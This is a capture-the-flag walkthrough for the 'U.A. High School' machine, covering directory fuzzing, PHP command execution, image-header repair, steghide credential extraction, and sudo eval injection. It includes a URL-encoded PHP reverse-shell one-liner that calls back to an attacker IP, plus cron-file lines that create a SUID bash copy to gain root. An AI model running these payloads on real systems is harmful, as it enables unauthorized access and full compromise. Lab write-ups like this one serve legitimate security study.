# Overview

U.A. High School is a CTF challenge that involves multiple stages of enumeration, exploitation, and privilege escalation. The challenge focuses on identifying web application vulnerabilities, analyzing hidden data through steganography, discovering credentials, and exploiting Linux misconfigurations to obtain root access.

The challenge provides hands-on experience with several penetration testing techniques, from initial reconnaissance to complete system compromise.

---

## 1. Enumeration

### Nmap Scan

![](../Images/Pasted%20image%2020261110004750.png)

The Nmap scan revealed two open ports:

- SSH
    
- HTTP
    

We initially inspected the web application but did not find anything particularly interesting. Therefore, we moved on to directory fuzzing using Gobuster.

![](../Images/Pasted%20image%2020261110005032.png)

```
gobuster dir -u http://10.130.182.29 -w /usr/share/dirb/wordlists/common.txt -t 60
```

The scan revealed a hidden directory named `assets`.

![](../Images/Pasted%20image%2020261110005138.png)

We navigated to the discovered directory, but it appeared to be empty, with no visible content.

![](../Images/Pasted%20image%2020261110005226.png)

We decided to perform another fuzzing scan, this time targeting the `assets` directory and including PHP files in the extension search.

```
gobuster dir -u http://10.130.182.29/assets -w /usr/share/dirb/wordlists/common.txt -t 60 -x php
```

![](../Images/Pasted%20image%2020261110005410.png)

The scan revealed a PHP file inside the directory. We suspected that one of its parameters might be vulnerable, potentially allowing us to achieve Remote Code Execution (RCE).

## 2. Initial Access

### Remote Code Execution (RCE)

We accessed the discovered PHP page and attempted to execute the `whoami` command to determine whether the application allowed system command execution.

The response was returned in Base64-encoded form.

![](../Images/Pasted%20image%2020261110005615.png)

After decoding the Base64 output, we confirmed that the application was executing commands on the underlying operating system.

This confirmed the presence of a Remote Code Execution (RCE) vulnerability.

![](../Images/Pasted%20image%2020261110005835.png)

### Obtaining a Reverse Shell

After confirming the RCE vulnerability, we prepared a PHP-based reverse shell payload to obtain an interactive connection to the target machine.

We URL-encoded the payload before submitting it through the vulnerable application.

```
php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.144.71%22%2C4444%29%3Bpassthru%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

![](../Images/Pasted%20image%2020261110010028.png)

The payload executed successfully, and we received a reverse shell connection.

![](../Images/Pasted%20image%2020261110010118.png)

## 3. Credential Discovery

During our enumeration of the compromised machine, we discovered a passphrase stored in Base64-encoded form.

![](../Images/Pasted%20image%2020261110010229.png)

We decoded the value and identified it as a potential password or passphrase that could be useful for accessing other resources on the machine.

![](../Images/Pasted%20image%2020261110010522.png)

### Image Analysis

While exploring the machine, we discovered several image files that could potentially contain hidden information.

![](../Images/Pasted%20image%2020261110010742.png)

We transferred the discovered images to our local machine for further analysis.

![](../Images/Pasted%20image%2020261110010900.png)

However, when we attempted to open one of the images, we found that it appeared to be corrupted.

![](../Images/Pasted%20image%2020261110011005.png)

To investigate the issue, we examined the image's hexadecimal contents using `hexeditor`.

The inspection revealed that the initial bytes of the file, known as the file signature or magic bytes, had been modified to resemble a PNG file signature.

![](../Images/Pasted%20image%2020261110011154.png)

Since the image was originally a JPEG file, we identified the correct JPEG signature and modified the file header accordingly.

![](../Images/Pasted%20image%2020261110011734.png)

After correcting the file signature, we successfully opened the image.

![](../Images/Pasted%20image%2020261110011800.png)

### Steganography Analysis

With the image repaired, we used `steghide` to investigate whether it contained hidden information.

The tool requested a passphrase, so we provided the passphrase discovered earlier.

![](../Images/Pasted%20image%2020261110011909.png)

The extraction was successful and revealed a username and password.

![](../Images/Pasted%20image%2020261110012004.png)

## 4. SSH Access

Using the recovered credentials, we successfully authenticated to the target machine through SSH.

![](../Images/Pasted%20image%2020261110012051.png)

## 5. Privilege Escalation

### Sudo Permissions Enumeration

After gaining SSH access, we checked the current user's sudo privileges using:

```
sudo -l
```

The output revealed a script that we were allowed to execute with root privileges.

![](../Images/Pasted%20image%2020261110012159.png)

### Identifying the Vulnerability

We inspected the script to understand its functionality and identify potential security weaknesses.

The script prompted the user to provide feedback, then printed the input and stored it in a file.

However, we noticed that the script used `eval` before the `echo` command.

The `eval` function evaluates its input as shell code rather than treating it as ordinary text. This means that user-controlled input could potentially be interpreted and executed as commands.

Since the script could be executed with root privileges, this introduced a command injection vulnerability that could be abused for privilege escalation.

![](../Images/Pasted%20image%2020261110012351.png)

### Exploiting the Misconfiguration

We identified an approach involving a scheduled cron job running with root privileges. The intended sequence was to create a copy of `/bin/bash` in `/tmp` and modify its permissions to enable SUID execution.

The cron configuration involved the following commands:

```
'* * * * * root cp /bin/bash /tmp/script ' >/etc/cron.d/pwn
```

```
'* * * * * root chmod +s /tmp/script ' >> /etc/cron.d/pwn
```

After the scheduled task executed, we ran:

```
/tmp/script -p
```

The `-p` option allows Bash to preserve its elevated effective privileges when running in privileged mode.

![](../Images/Pasted%20image%2020261110013307.png)

### Root Access Obtained